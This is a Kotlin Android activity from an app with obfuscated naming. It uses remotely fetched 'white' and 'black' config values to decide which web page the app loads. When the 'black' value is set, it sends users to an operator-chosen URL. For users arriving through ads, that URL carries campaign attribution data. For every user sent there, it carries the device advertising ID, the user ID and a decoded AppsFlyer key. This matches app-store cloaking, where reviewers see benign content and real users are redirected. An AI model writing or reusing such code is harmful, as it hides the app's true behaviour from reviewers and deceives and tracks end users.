package com.parimka.machas.com

import android.content.Intent
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.transition.ChangeBounds
import android.transition.Scene
import android.transition.TransitionManager
import android.widget.ProgressBar
import androidx.core.app.ActivityOptionsCompat
import androidx.lifecycle.lifecycleScope
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.parimka.machas.com.Utilities2ki78.*
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity2ki78 : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main_2ki78)
        getSharedPreferences("SP_2ki78", MODE_PRIVATE).getString("Last_Page_2ki78", null)?.let {
            startActivity(Intent(this, WebActivity2ki78::class.java))
            finish()
        }
        Firebase.remoteConfig.run {
            setConfigSettingsAsync(
                remoteConfigSettings {
                    minimumFetchIntervalInSeconds = 1000
                })
            setDefaultsAsync(
                mapOf(
                    FB_BLACK_KEY_2ki78 to "empty"
                )
            )
            fetchAndActivate().addOnCompleteListener {
                if (it.isSuccessful) {
                    fbBlackValue2ki78 = getString(FB_BLACK_KEY_2ki78)
                    fbDefaultValue2ki78 = getString(FB_DEFAULT_KEY_2ki78)
                    fbWhiteValue2ki78 = getString(FB_WHITE_KEY_2ki78)
                }
            }
        }
        clickSetup2ki78 {
            it.isClickable = false
            TransitionManager.go(
                Scene.getSceneForLayout(findViewById(R.id.cl_2ki78), R.layout.scene_main_2ki78, this),
                ChangeBounds()
            )
            lifecycleScope.launch {
                delay(100)
                animationBackGround2ki78()
                for (i2ki78 in 0..100) {
                    findViewById<ProgressBar>(R.id.pb_2ki78).progress = i2ki78
                    delay(50)
                }
                parsedURL2ki78 = if (fbBlackValue2ki78 == null || fbBlackValue2ki78 == "empty") {
                    fbWhiteValue2ki78 ?: return@launch
                } else {
                    if (status2ki78 == "Non-organic") {
                        if (key2ki78.toString().length != 20) {
                            Uri.parse(fbBlackValue2ki78).buildUpon()
                                .appendQueryParameter("key", fbDefaultValue2ki78)
                                .appendQueryParameter("bundle", packageName)
                                .appendQueryParameter("sub4", adGroup2ki78)
                                .appendQueryParameter("sub5", adSet22ki78)
                                .appendQueryParameter("sub6", afChannel2ki78)
                                .appendQueryParameter("sub7", "Default")
                                .toString()
                                .plus(
                                    "&sub10=$uid2ki78||$AID2ki78||${
                                        CODE_APPSFLYER_2ki78.decodeStrings2ki78()
                                    }"
                                )

                        } else {
                            Uri.parse(fbBlackValue2ki78).buildUpon()
                                .appendQueryParameter("key", key2ki78)
                                .appendQueryParameter("bundle", packageName)
                                .appendQueryParameter("sub2", sub22ki78)
                                .appendQueryParameter("sub3", sub32ki78)
                                .appendQueryParameter("sub4", adGroup2ki78)
                                .appendQueryParameter("sub5", adSet22ki78)
                                .appendQueryParameter("sub6", afChannel2ki78)
                                .appendQueryParameter("sub7", mediaSource2ki78)
                                .toString()
                                .plus(
                                    "&sub10=$uid2ki78||$AID2ki78||${
                                        CODE_APPSFLYER_2ki78.decodeStrings2ki78()
                                    }"
                                )

                        }
                    } else {
                        Uri.parse(fbBlackValue2ki78).buildUpon()
                            .appendQueryParameter("key", fbDefaultValue2ki78)
                            .appendQueryParameter("bundle", packageName)
                            .appendQueryParameter("sub7", "Organic")
                            .toString()
                            .plus(
                                "&sub10=$uid2ki78||$AID2ki78||${
                                    CODE_APPSFLYER_2ki78.decodeStrings2ki78()
                                }"
                            )

                    }
                }
                startActivity(
                    Intent(this@MainActivity2ki78, WebActivity2ki78::class.java),
                    ActivityOptionsCompat.makeSceneTransitionAnimation(this@MainActivity2ki78,
                        findViewById(R.id.v_2ki78),
                        "view_in")
                        .toBundle())

            }
        }
    }

    override fun onStop() {
        finish()
        super.onStop()
    }
}